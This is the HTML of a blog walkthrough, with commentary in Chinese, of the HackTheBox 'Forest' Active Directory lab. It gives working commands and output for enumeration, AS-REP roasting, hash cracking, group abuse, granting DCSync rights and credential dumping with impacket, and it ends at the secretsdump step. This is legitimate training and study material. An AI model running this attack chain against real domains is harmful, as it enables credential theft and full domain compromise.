@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allVictim’s IP : 10.10.10.161Victim’s Host : *.htb.locaclAttacker’s IP : 10.10.14.14   RECONport scanCommand   1rustscan -a 10.10.10.161 --ulimit 5000 -- -sC -sV -Pn Result 12345678910111213141">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Forest on HackTheBox">
+<meta property="og:url" content="http://wha13.github.io/2024/12/22/forest-htb/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allVictim’s IP : 10.10.10.161Victim’s Host : *.htb.locaclAttacker’s IP : 10.10.14.14   RECONport scanCommand   1rustscan -a 10.10.10.161 --ulimit 5000 -- -sC -sV -Pn Result 12345678910111213141">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyvaF7rHkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1zPo7Br1g.png">
+<meta property="article:published_time" content="2024-12-23T03:11:05.000Z">
+<meta property="article:modified_time" content="2024-12-22T06:14:08.371Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="WriteDacl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SyvaF7rHkl.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Forest on HackTheBox</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/19/vintage-htb/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/22/forest-htb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/22/forest-htb/&text=Forest on HackTheBox"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/22/forest-htb/&is_video=false&description=Forest on HackTheBox"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Forest on HackTheBox&body=Check out this article: http://wha13.github.io/2024/12/22/forest-htb/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/22/forest-htb/&title=Forest on HackTheBox"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/22/forest-htb/&name=Forest on HackTheBox&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/22/forest-htb/&t=Forest on HackTheBox"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">smb enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">3.1.</span> <span class="toc-text">AS-REP Roasting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RECON-with-bloodhound"><span class="toc-number">4.1.</span> <span class="toc-text">RECON with bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-GenericAll-to-Exchange-Windows-Permissions"><span class="toc-number">4.2.</span> <span class="toc-text">Abusing GenericAll to Exchange Windows Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteDacl-to-DCSync"><span class="toc-number">4.3.</span> <span class="toc-text">WriteDacl to DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-The-Hash"><span class="toc-number">4.4.</span> <span class="toc-text">Pass The Hash</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Forest on HackTheBox
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-23T03:11:05.000Z" class="dt-published" itemprop="datePublished">2024-12-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AD/" rel="tag">AD</a>, <a class="p-category" href="/tags/Active-Directory/" rel="tag">Active Directory</a>, <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>, <a class="p-category" href="/tags/WriteDacl/" rel="tag">WriteDacl</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Victim’s IP : 10.10.10.161<br>Victim’s Host : *.htb.locacl<br>Attacker’s IP : 10.10.14.14  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.10.161 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      REASON          VERSION</span><br><span class="line">53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-22 01:54:53Z)</span><br><span class="line">135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?    syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49928/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-12-22T01:55:49</span><br><span class="line">|_  start_date: 2024-12-22T01:47:26</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2024-12-21T17:55:45-08:00</span><br><span class="line">|_clock-skew: mean: 2h46m51s, deviation: 4h37m08s, median: 6m50s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 32753/tcp): CLEAN (Couldn&#x27;t connect)</span><br><span class="line">|   Check 2 (port 41142/tcp): CLEAN (Couldn&#x27;t connect)</span><br><span class="line">|   Check 3 (port 44587/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 41891/udp): CLEAN (Failed to receive data)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有開啟 ldap, smb, kerberos, winrpc，一樣一台標準的 Domain Controller  </p>
+<h3 id="smb-enumeration"><a href="#smb-enumeration" class="headerlink" title="smb enumeration"></a>smb enumeration</h3><p>利用 enum4linux 對主機進行 RECON<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.10.161</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[$331000-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]</span><br><span class="line">user:[andy] rid:[0x47e]</span><br><span class="line">user:[mark] rid:[0x47f]</span><br><span class="line">user:[santi] rid:[0x480]</span><br><span class="line">......</span><br><span class="line">[+]  Getting domain groups:                                                                                              </span><br><span class="line">                                                                                                                         </span><br><span class="line">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                              </span><br><span class="line">group:[Domain Admins] rid:[0x200]</span><br><span class="line">group:[Domain Users] rid:[0x201]</span><br><span class="line">group:[Domain Guests] rid:[0x202]</span><br><span class="line">group:[Domain Computers] rid:[0x203]</span><br><span class="line">group:[Domain Controllers] rid:[0x204]</span><br><span class="line">group:[Schema Admins] rid:[0x206]</span><br><span class="line">group:[Enterprise Admins] rid:[0x207]</span><br><span class="line">group:[Group Policy Creator Owners] rid:[0x208]</span><br><span class="line">group:[Read-only Domain Controllers] rid:[0x209]</span><br><span class="line">group:[Cloneable Domain Controllers] rid:[0x20a]</span><br><span class="line">group:[Protected Users] rid:[0x20d]</span><br><span class="line">group:[Key Admins] rid:[0x20e]</span><br><span class="line">group:[Enterprise Key Admins] rid:[0x20f]</span><br><span class="line">group:[DnsUpdateProxy] rid:[0x44e]</span><br><span class="line">group:[Organization Management] rid:[0x450]</span><br><span class="line">group:[Recipient Management] rid:[0x451]</span><br><span class="line">group:[View-Only Organization Management] rid:[0x452]</span><br><span class="line">group:[Public Folder Management] rid:[0x453]</span><br><span class="line">group:[UM Management] rid:[0x454]</span><br><span class="line">group:[Help Desk] rid:[0x455]</span><br><span class="line">group:[Records Management] rid:[0x456]</span><br><span class="line">group:[Discovery Management] rid:[0x457]</span><br><span class="line">group:[Server Management] rid:[0x458]</span><br><span class="line">group:[Delegated Setup] rid:[0x459]</span><br><span class="line">group:[Hygiene Management] rid:[0x45a]</span><br><span class="line">group:[Compliance Management] rid:[0x45b]</span><br><span class="line">group:[Security Reader] rid:[0x45c]</span><br><span class="line">group:[Security Administrator] rid:[0x45d]</span><br><span class="line">group:[Exchange Servers] rid:[0x45e]</span><br><span class="line">group:[Exchange Trusted Subsystem] rid:[0x45f]</span><br><span class="line">group:[Managed Availability Servers] rid:[0x460]</span><br><span class="line">group:[Exchange Windows Permissions] rid:[0x461]</span><br><span class="line">group:[ExchangeLegacyInterop] rid:[0x462]</span><br><span class="line">group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]</span><br><span class="line">group:[Service Accounts] rid:[0x47c]</span><br><span class="line">group:[Privileged IT Accounts] rid:[0x47d]</span><br><span class="line">group:[test] rid:[0x13ed]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>獲得主機的 users 和 groups 資訊  </p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>利用 impacket-GetNPUsers 嘗試獲得不須驗證的使用者 TGT<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers -dc-ip 10.10.10.161 -request -usersfile userlist.txt htb.local/</span><br></pre></td></tr></table></figure>
+
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:6e005121a120ef8f50c9d23ff218f302$bd992842039bfc5f2fb04802a946a170a9df31d3534d7308d68b6a5401ba0c4c677a2ccf19f6ea598ee21a35af46868c786c3d3ece27d8431baf4594970e6800a99133d86cc87304c45536d12baf5e0175ea977f0dc54836fe0430a1177374dde56d26e3576e2b7a28920792e3e3902f78451efca05be7acd2b85e6ec2e9a8973fa52d86771132cada8b166d5dc45853ac49b4adae9c3955892cb3955fc59bb5da2056c0974bc9464dd1400c34ccbdb437d5682fa76b377a8fda4b5b1dc7f5f4720c2f195854daf767a0f26911beda5c3cf1dbe31d168ceb029d63e631d177dc366514f2b131</span><br></pre></td></tr></table></figure>
+<p>獲得 svc-alfresco 的 TGT，將 hash 儲存後於檔案後利用john進行爆破<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/home/kali/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span><br><span class="line">Will run 6 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     </span><br><span class="line">1g 0:00:00:02 DONE (2024-12-21 21:05) 0.4444g/s 1815Kp/s 1815Kc/s 1815KC/s s428237..s3r2s1</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="RECON-with-bloodhound"><a href="#RECON-with-bloodhound" class="headerlink" title="RECON with bloodhound"></a>RECON with bloodhound</h3><p>拿到 svc-alfresco credential 後，以 bloodhound 進行 RECON<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;svc-alfresco&#x27;</span> -p <span class="string">&#x27;s3rvice&#x27;</span> -d htb.local -ns 10.10.10.161 --zip</span><br></pre></td></tr></table></figure>
+
+<p>找到一條攻擊鍊：<br><img src="https://hackmd.io/_uploads/SyvaF7rHkl.png" alt="image"><br>SVC-ALFRESCO -&gt; (一串 MemberOf 權限) -&gt; Account Operators -&gt; (GenricAll) Exchange Windows Permissions -&gt; (WriteDacl) -&gt; HTB.LOCAL  </p>
+<h3 id="Abusing-GenericAll-to-Exchange-Windows-Permissions"><a href="#Abusing-GenericAll-to-Exchange-Windows-Permissions" class="headerlink" title="Abusing GenericAll to Exchange Windows Permissions"></a>Abusing GenericAll to Exchange Windows Permissions</h3><p>將自己加入 <code>Exchange Windows Permissions</code> 組：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host forest.htb.local -d <span class="string">&quot;htb.local&quot;</span> --dc-ip 10.10.10.161 -u svc-alfresco -p s3rvice add groupMember <span class="string">&quot;EXCHANGE WINDOWS PERMISSIONS&quot;</span> <span class="string">&quot;svc-alfresco&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="WriteDacl-to-DCSync"><a href="#WriteDacl-to-DCSync" class="headerlink" title="WriteDacl to DCSync"></a>WriteDacl to DCSync</h3><p>利用 impaclet-dacledit 幫自己寫入 DCSync 權限：<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dacledit -target-dn <span class="string">&#x27;DC=htb,DC=local&#x27;</span> forest.htb.local/svc-alfresco:s3rvice -action write -rights DCSync -principal svc-alfresco</span><br></pre></td></tr></table></figure>
+<p>利用 DCSync dump NTLM Hash<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;htb.local&#x27;</span>/<span class="string">&#x27;svc-alfresco&#x27;</span>:<span class="string">&#x27;s3rvice&#x27;</span>@<span class="string">&#x27;htb.local&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
